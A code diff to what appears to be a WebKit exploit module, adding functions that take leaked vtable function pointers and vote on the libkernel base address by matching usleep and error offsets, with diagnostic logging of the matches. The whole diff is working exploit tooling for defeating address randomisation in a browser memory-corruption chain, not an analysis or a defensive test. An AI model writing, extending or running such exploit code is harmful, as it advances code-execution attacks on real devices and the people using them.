@@ -413,6 +413,78 @@ function extEntryCodeNum(entry) {
     return Number.isFinite(n) ? (n >>> 0) : null;
 }
 
+function lkLoTag(lk) {
+    if (!lk) return "????";
+    return ((lk.low >>> 0) & 0xfff).toString(16);
+}
+
+/** Per ext fn ptr: which RVAs yield …c30 / 16KB lk (0 reads). For logging + debug. */
+export function diagnoseExtPtrLkMatches(entries, off, webkitBase) {
+    off = off || {};
+    const out = [];
+    if (!entries || !entries.length) return out;
+
+    for (let ei = 0; ei < entries.length; ei++) {
+        const entry = entries[ei];
+        const code = extEntryCodeNum(entry);
+        const row = {
+            label: entry.label || "ext",
+            hex: "",
+            skipped: false,
+            skipReason: null,
+            code: code != null ? fmtMagic(code) : (entry.code || null),
+            matches: [],
+        };
+        if (code === WEBKIT_CODE_PROLOGUE) {
+            row.skipped = true;
+            row.skipReason = "webkit-prologue";
+            out.push(row);
+            continue;
+        }
+        const fnPtr = extEntryFnPtr(entry);
+        if (!fnPtr) {
+            row.skipped = true;
+            row.skipReason = "bad-ptr";
+            out.push(row);
+            continue;
+        }
+        row.hex = ptrBig(fnPtr).toString(16);
+        if (!plausibleExtPtr(fnPtr, webkitBase, off)) {
+            row.skipped = true;
+            row.skipReason = "not-ext";
+            out.push(row);
+            continue;
+        }
+        const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
+        for (let zi = 0; zi < zeros.length; zi++) {
+            const z = zeros[zi];
+            row.matches.push({
+                key: z.key,
+                rva: z.rva,
+                lk: String(z.lk),
+                lkTag: lkLoTag(z.lk),
+                via: z.via,
+            });
+        }
+        out.push(row);
+    }
+    return out;
+}
+
+export function formatExtPtrDiagLine(d) {
+    if (!d) return "";
+    if (d.skipped)
+        return d.label + " fn=0x" + (d.hex || "?") + " SKIP " + (d.skipReason || "?");
+    if (!d.matches.length)
+        return d.label + " fn=0x" + d.hex + " — no RVA → …c30 lk";
+    const parts = [];
+    for (let i = 0; i < d.matches.length && i < 6; i++) {
+        const m = d.matches[i];
+        parts.push(m.key + "→0x" + m.lk + " (…" + m.lkTag + ")");
+    }
+    return d.label + " fn=0x" + d.hex + " " + parts.join(" ");
+}
+
 /** Live textarea/expm1 vtables → external code pointers (skips webkit interior). */
 export function collectLiveVtableExtPtrs(p, webkitBase, off, opts) {
     opts = opts || {};
@@ -472,8 +544,10 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
     const minDistinctFn = opts.minDistinctFn != null
         ? opts.minDistinctFn
         : (minVotes > 1 ? 2 : 1);
+    const allowSinglePriRva = opts.allowSinglePriRva === true;
     const lkVotes = new Map();
     const hexList = [];
+    const ptrDiag = diagnoseExtPtrLkMatches(entries, off, webkitBase);
     let skipped = 0;
     let tried = 0;
 
@@ -492,14 +566,11 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         tried++;
         hexList.push(ptrBig(fnPtr).toString(16));
         const fnKey = ptrBig(fnPtr).toString(16);
+        const fnLabel = entry.label || "ext";
 
         const zeros = calcLkFromFnPtrZeroRead(fnPtr, off);
-        let lkUs = null;
-        let lkEr = null;
         for (let zi = 0; zi < zeros.length; zi++) {
             const z = zeros[zi];
-            if (z.key === "k_usleep") lkUs = String(z.lk);
-            if (z.key === "k__error") lkEr = String(z.lk);
             const key = String(z.lk);
             let ent = lkVotes.get(key);
             if (!ent) {
@@ -509,32 +580,45 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
                     vias: [],
                     refs: [],
                     fnKeys: new Set(),
-                    dualRvaFns: new Set(),
+                    fnRefs: [],
+                    hasUsleep: false,
+                    hasError: false,
                 };
                 lkVotes.set(key, ent);
             }
             ent.count++;
             ent.fnKeys.add(fnKey);
-            if (ent.vias.indexOf(z.via) < 0 && ent.vias.length < 4)
+            if (z.key === "k_usleep") ent.hasUsleep = true;
+            if (z.key === "k__error") ent.hasError = true;
+            if (ent.vias.indexOf(z.via) < 0 && ent.vias.length < 6)
                 ent.vias.push(z.via);
-            const ref = (entry.label || "ext") + ":" + fnKey.slice(-8);
-            if (ent.refs.length < 6)
-                ent.refs.push(ref);
-        }
-        if (lkUs && lkEr && lkUs === lkEr) {
-            const ent = lkVotes.get(lkUs);
-            if (ent) ent.dualRvaFns.add(fnKey);
+            const ref = fnLabel + ":0x" + fnKey;
+            if (ent.fnRefs.length < 8) {
+                let dup = false;
+                for (let ri = 0; ri < ent.fnRefs.length; ri++) {
+                    if (ent.fnRefs[ri].hex === fnKey && ent.fnRefs[ri].via === z.via) {
+                        dup = true;
+                        break;
+                    }
+                }
+                if (!dup)
+                    ent.fnRefs.push({ label: fnLabel, hex: fnKey, via: z.via, key: z.key });
+            }
+            const refShort = fnLabel + ":" + fnKey.slice(-8);
+            if (ent.refs.length < 8 && ent.refs.indexOf(refShort) < 0)
+                ent.refs.push(refShort);
         }
     }
 
     const zeroRank = [];
     lkVotes.forEach(function (ent) {
         ent.distinctFn = ent.fnKeys ? ent.fnKeys.size : 0;
-        ent.dualRva = ent.dualRvaFns ? ent.dualRvaFns.size : 0;
+        ent.crossRva = (ent.hasUsleep && ent.hasError) ? 1 : 0;
+        ent.dualRva = ent.crossRva;
         zeroRank.push(ent);
     });
     zeroRank.sort(function (a, b) {
-        return b.dualRva - a.dualRva
+        return b.crossRva - a.crossRva
             || b.distinctFn - a.distinctFn
             || b.count - a.count
             || b.vias.length - a.vias.length;
@@ -542,28 +626,42 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
 
     for (let ri = 0; ri < zeroRank.length; ri++) {
         const cand = zeroRank[ri];
-        const dualOk = cand.dualRva >= 1;
+        const crossRvaOk = cand.crossRva >= 1;
         const distinctOk = cand.distinctFn >= minDistinctFn;
-        if (!dualOk && !distinctOk) continue;
-        if (cand.count < minVotes && !dualOk) continue;
+        const singlePriOk = allowSinglePriRva && cand.distinctFn >= 1
+            && cand.vias.some(function (v) {
+                return v === "rva-k_usleep" || v === "rva-k__error";
+            });
+        if (!crossRvaOk && !distinctOk && !singlePriOk) continue;
+        if (cand.count < minVotes && !crossRvaOk && !singlePriOk) continue;
         const v = verifyLibkernelZeroRead(cand.lk, off, { via: "zero-vote" });
         if (!v.ok) continue;
+        const method = crossRvaOk ? "cross-rva"
+            : (singlePriOk ? "single-pri-rva" : "zero-vote");
+        const via = crossRvaOk
+            ? "usleep+error→" + String(cand.lk) + "+" + cand.distinctFn + "fn"
+            : (singlePriOk
+                ? cand.vias.filter(function (x) {
+                    return x === "rva-k_usleep" || x === "rva-k__error";
+                }).join("+") + "→" + String(cand.lk)
+                : "zero-vote+" + cand.distinctFn + "fn+" + cand.count + "x");
         return {
             ok: true,
             lk: cand.lk,
-            via: dualOk
-                ? "dual-rva+" + cand.dualRva + "fn+" + cand.count + "x"
-                : "zero-vote+" + cand.distinctFn + "fn+" + cand.count + "x",
-            method: dualOk ? "dual-rva" : "zero-vote",
+            via: via,
+            method: method,
             vote: cand.count,
             distinctFn: cand.distinctFn,
-            dualRva: cand.dualRva,
+            crossRva: cand.crossRva,
+            dualRva: cand.crossRva,
+            fnRefs: cand.fnRefs || [],
             rank: ri,
             tried: tried,
             skipped: skipped,
             zeroRead: true,
             reads: 0,
-            zeroRank: zeroRank.slice(0, 4),
+            zeroRank: zeroRank.slice(0, 6),
+            ptrDiag: ptrDiag,
         };
     }
 
@@ -615,11 +713,18 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         }
     }
 
-    let hint = "need 2+ distinct ext fn ptrs OR 1 ptr where fn−usleep AND fn−error → same …"
+    let hint = "need 2+ distinct ext fn ptrs → same …"
         + (lkBaseTag(off) != null ? lkBaseTag(off).toString(16) : "c30")
-        + " (0 reads)";
-    if (zeroRank.length === 1 && zeroRank[0].distinctFn < 2 && !zeroRank[0].dualRva) {
-        hint = "1 ext fn matched one RVA — need usleep+error agree on same base, or 2nd ext ptr";
+        + ", OR usleep ptr + error ptr → same lk (0 reads)";
+    const matchedPtrs = ptrDiag.filter(function (d) { return !d.skipped && d.matches.length; });
+    if (matchedPtrs.length === 1) {
+        const m = matchedPtrs[0];
+        const via = m.matches.map(function (x) {
+            return x.key + "→0x" + x.lk + " (…" + x.lkTag + ")";
+        }).join("; ");
+        hint = "1 ptr matched (need 2): " + m.label + " fn=0x" + m.hex + " — " + via;
+    } else if (matchedPtrs.length > 1 && zeroRank.length && zeroRank[0].distinctFn < 2) {
+        hint = matchedPtrs.length + " ptrs each hit different lk — need 2 ptrs → same base";
     }
 
     return {
@@ -629,6 +734,8 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         tried: tried,
         skipped: skipped,
         zeroRank: zeroRank.slice(0, 6),
+        ptrDiag: ptrDiag,
+        matchedPtrs: matchedPtrs.length,
         zeroRead: true,
         reads: 0,
     };
